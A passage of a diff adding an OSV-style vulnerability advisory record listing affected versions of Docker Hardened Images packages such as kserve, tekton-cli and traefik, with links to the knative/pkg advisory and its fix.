+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-router-fips",
+        "purl": "pkg:apk/dhi/kserve-router-fips"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-router",
+        "purl": "pkg:apk/dhi/kserve-router"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve",
+        "purl": "pkg:apk/dhi/kserve"
+      },
+      "versions": [
+        "0.18.0-r0",
+        "0.18.0-r1",
+        "0.18.0-r2",
+        "0.19.0-r0",
+        "0.19.0-r1",
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "tekton-cli-dev",
+        "purl": "pkg:apk/dhi/tekton-cli-dev"
+      },
+      "versions": [
+        "0.45.1-r0",
+        "0.46.0-r1",
+        "0.46.0-r2",
+        "0.46.0-r3",
+        "0.46.0-r4",
+        "0.46.0-r5",
+        "0.46.0-r6",
+        "0.46.0-r7",
+        "0.46.1-r0",
+        "0.46.1-r1",
+        "0.46.1-r2",
+        "0.46.1-r3",
+        "0.46.2-r0",
+        "0.46.2-r1",
+        "0.46.2-r2",
+        "0.46.2-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "tekton-cli-fips-dev",
+        "purl": "pkg:apk/dhi/tekton-cli-fips-dev"
+      },
+      "versions": [
+        "0.45.1-r0",
+        "0.46.0-r1",
+        "0.46.0-r2",
+        "0.46.0-r3",
+        "0.46.0-r4",
+        "0.46.0-r5",
+        "0.46.0-r6",
+        "0.46.0-r7",
+        "0.46.1-r0",
+        "0.46.1-r1",
+        "0.46.1-r2",
+        "0.46.1-r3",
+        "0.46.2-r0",
+        "0.46.2-r1",
+        "0.46.2-r2",
+        "0.46.2-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "tekton-cli-fips",
+        "purl": "pkg:apk/dhi/tekton-cli-fips"
+      },
+      "versions": [
+        "0.45.1-r0",
+        "0.46.0-r1",
+        "0.46.0-r2",
+        "0.46.0-r3",
+        "0.46.0-r4",
+        "0.46.0-r5",
+        "0.46.0-r6",
+        "0.46.0-r7",
+        "0.46.1-r0",
+        "0.46.1-r1",
+        "0.46.1-r2",
+        "0.46.1-r3",
+        "0.46.2-r0",
+        "0.46.2-r1",
+        "0.46.2-r2",
+        "0.46.2-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "tekton-cli",
+        "purl": "pkg:apk/dhi/tekton-cli"
+      },
+      "versions": [
+        "0.45.1-r0",
+        "0.46.0-r1",
+        "0.46.0-r2",
+        "0.46.0-r3",
+        "0.46.0-r4",
+        "0.46.0-r5",
+        "0.46.0-r6",
+        "0.46.0-r7",
+        "0.46.1-r0",
+        "0.46.1-r1",
+        "0.46.1-r2",
+        "0.46.1-r3",
+        "0.46.2-r0",
+        "0.46.2-r1",
+        "0.46.2-r2",
+        "0.46.2-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-3.6-dev",
+        "purl": "pkg:apk/dhi/traefik-3.6-dev"
+      },
+      "versions": [
+        "3.6.21-r1",
+        "3.6.22-r0",
+        "3.6.22-r1",
+        "3.6.22-r2",
+        "3.6.24-r0",
+        "3.6.25-r0",
+        "3.6.25-r2",
+        "3.6.25-r3",
+        "3.6.25-r4",
+        "3.6.25-r5",
+        "3.6.25-r6",
+        "3.6.25-r7",
+        "3.6.25-r8",
+        "3.6.25-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-3.6-fips-dev",
+        "purl": "pkg:apk/dhi/traefik-3.6-fips-dev"
+      },
+      "versions": [
+        "3.6.21-r1",
+        "3.6.22-r0",
+        "3.6.22-r1",
+        "3.6.22-r2",
+        "3.6.24-r0",
+        "3.6.25-r0",
+        "3.6.25-r2",
+        "3.6.25-r3",
+        "3.6.25-r4",
+        "3.6.25-r5",
+        "3.6.25-r6",
+        "3.6.25-r7",
+        "3.6.25-r8",
+        "3.6.25-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-3.6-fips",
+        "purl": "pkg:apk/dhi/traefik-3.6-fips"
+      },
+      "versions": [
+        "3.6.21-r1",
+        "3.6.22-r0",
+        "3.6.22-r1",
+        "3.6.22-r2",
+        "3.6.24-r0",
+        "3.6.25-r0",
+        "3.6.25-r2",
+        "3.6.25-r3",
+        "3.6.25-r4",
+        "3.6.25-r5",
+        "3.6.25-r6",
+        "3.6.25-r7",
+        "3.6.25-r8",
+        "3.6.25-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-3.6",
+        "purl": "pkg:apk/dhi/traefik-3.6"
+      },
+      "versions": [
+        "3.6.21-r1",
+        "3.6.22-r0",
+        "3.6.22-r1",
+        "3.6.22-r2",
+        "3.6.24-r0",
+        "3.6.25-r0",
+        "3.6.25-r2",
+        "3.6.25-r3",
+        "3.6.25-r4",
+        "3.6.25-r5",
+        "3.6.25-r6",
+        "3.6.25-r7",
+        "3.6.25-r8",
+        "3.6.25-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-3.7-dev",
+        "purl": "pkg:apk/dhi/traefik-3.7-dev"
+      },
+      "versions": [
+        "3.7.10-r0",
+        "3.7.10-r2",
+        "3.7.11-r0",
+        "3.7.11-r1",
+        "3.7.11-r2",
+        "3.7.12-r0",
+        "3.7.12-r1",
+        "3.7.13-r0",
+        "3.7.13-r1",
+        "3.7.13-r2",
+        "3.7.14-r0",
+        "3.7.14-r1",
+        "3.7.15-r0",
+        "3.7.16-r0",
+        "3.7.16-r1",
+        "3.7.16-r2",
+        "3.7.17-r0",
+        "3.7.18-r0",
+        "3.7.18-r1",
+        "3.7.5-r1",
+        "3.7.6-r0",
+        "3.7.6-r1",
+        "3.7.6-r2",
+        "3.7.9-r0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-3.7-fips-dev",
+        "purl": "pkg:apk/dhi/traefik-3.7-fips-dev"
+      },
+      "versions": [
+        "3.7.10-r0",
+        "3.7.10-r2",
+        "3.7.11-r0",
+        "3.7.11-r1",
+        "3.7.11-r2",
+        "3.7.12-r0",
+        "3.7.12-r1",
+        "3.7.13-r0",
+        "3.7.13-r1",
+        "3.7.13-r2",
+        "3.7.14-r0",
+        "3.7.14-r1",
+        "3.7.15-r0",
+        "3.7.16-r0",
+        "3.7.16-r1",
+        "3.7.16-r2",
+        "3.7.17-r0",
+        "3.7.18-r0",
+        "3.7.18-r1",
+        "3.7.5-r1",
+        "3.7.6-r0",
+        "3.7.6-r1",
+        "3.7.6-r2",
+        "3.7.9-r0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-3.7-fips",
+        "purl": "pkg:apk/dhi/traefik-3.7-fips"
+      },
+      "versions": [
+        "3.7.10-r0",
+        "3.7.10-r2",
+        "3.7.11-r0",
+        "3.7.11-r1",
+        "3.7.11-r2",
+        "3.7.12-r0",
+        "3.7.12-r1",
+        "3.7.13-r0",
+        "3.7.13-r1",
+        "3.7.13-r2",
+        "3.7.14-r0",
+        "3.7.14-r1",
+        "3.7.15-r0",
+        "3.7.16-r0",
+        "3.7.16-r1",
+        "3.7.16-r2",
+        "3.7.17-r0",
+        "3.7.18-r0",
+        "3.7.18-r1",
+        "3.7.5-r1",
+        "3.7.6-r0",
+        "3.7.6-r1",
+        "3.7.6-r2",
+        "3.7.9-r0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-3.7",
+        "purl": "pkg:apk/dhi/traefik-3.7"
+      },
+      "versions": [
+        "3.7.10-r0",
+        "3.7.10-r2",
+        "3.7.11-r0",
+        "3.7.11-r1",
+        "3.7.11-r2",
+        "3.7.12-r0",
+        "3.7.12-r1",
+        "3.7.13-r0",
+        "3.7.13-r1",
+        "3.7.13-r2",
+        "3.7.14-r0",
+        "3.7.14-r1",
+        "3.7.15-r0",
+        "3.7.16-r0",
+        "3.7.16-r1",
+        "3.7.16-r2",
+        "3.7.17-r0",
+        "3.7.18-r0",
+        "3.7.18-r1",
+        "3.7.5-r1",
+        "3.7.6-r0",
+        "3.7.6-r1",
+        "3.7.6-r2",
+        "3.7.9-r0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-dev",
+        "purl": "pkg:apk/dhi/traefik-dev"
+      },
+      "versions": [
+        "3.6.17-r0",
+        "3.6.17-r1",
+        "3.6.17-r2",
+        "3.6.18-r0",
+        "3.6.19-r0",
+        "3.6.20-r0",
+        "3.6.21-r0",
+        "3.6.21-r1",
+        "3.7.1-r0",
+        "3.7.1-r1",
+        "3.7.1-r2",
+        "3.7.2-r0",
+        "3.7.3-r0",
+        "3.7.4-r0",
+        "3.7.5-r0",
+        "3.7.5-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-fips-dev",
+        "purl": "pkg:apk/dhi/traefik-fips-dev"
+      },
+      "versions": [
+        "3.6.17-r0",
+        "3.6.17-r1",
+        "3.6.17-r2",
+        "3.6.18-r0",
+        "3.6.19-r0",
+        "3.6.20-r0",
+        "3.6.21-r0",
+        "3.6.21-r1",
+        "3.7.1-r0",
+        "3.7.1-r1",
+        "3.7.1-r2",
+        "3.7.2-r0",
+        "3.7.3-r0",
+        "3.7.4-r0",
+        "3.7.5-r0",
+        "3.7.5-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik-fips",
+        "purl": "pkg:apk/dhi/traefik-fips"
+      },
+      "versions": [
+        "3.6.17-r0",
+        "3.6.17-r1",
+        "3.6.17-r2",
+        "3.6.18-r0",
+        "3.6.19-r0",
+        "3.6.20-r0",
+        "3.6.21-r0",
+        "3.6.21-r1",
+        "3.7.1-r0",
+        "3.7.1-r1",
+        "3.7.1-r2",
+        "3.7.2-r0",
+        "3.7.3-r0",
+        "3.7.4-r0",
+        "3.7.5-r0",
+        "3.7.5-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "traefik",
+        "purl": "pkg:apk/dhi/traefik"
+      },
+      "versions": [
+        "3.6.17-r0",
+        "3.6.17-r1",
+        "3.6.17-r2",
+        "3.6.18-r0",
+        "3.6.19-r0",
+        "3.6.20-r0",
+        "3.6.21-r0",
+        "3.6.21-r1",
+        "3.7.1-r0",
+        "3.7.1-r1",
+        "3.7.1-r2",
+        "3.7.2-r0",
+        "3.7.3-r0",
+        "3.7.4-r0",
+        "3.7.5-r0",
+        "3.7.5-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-yypq-rp5h-clcv-cpwh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-2hw4-c9m4-f2fj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/knative/pkg/security/advisories/GHSA-2hw4-c9m4-f2fj"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/knative/pkg/pull/3363"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/knative/pkg/commit/52dbd5ece63fe6d2d340ecbebec160550f460818"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://pkg.go.dev/vuln/GO-2026-6880"
+    }
+  ]
+}
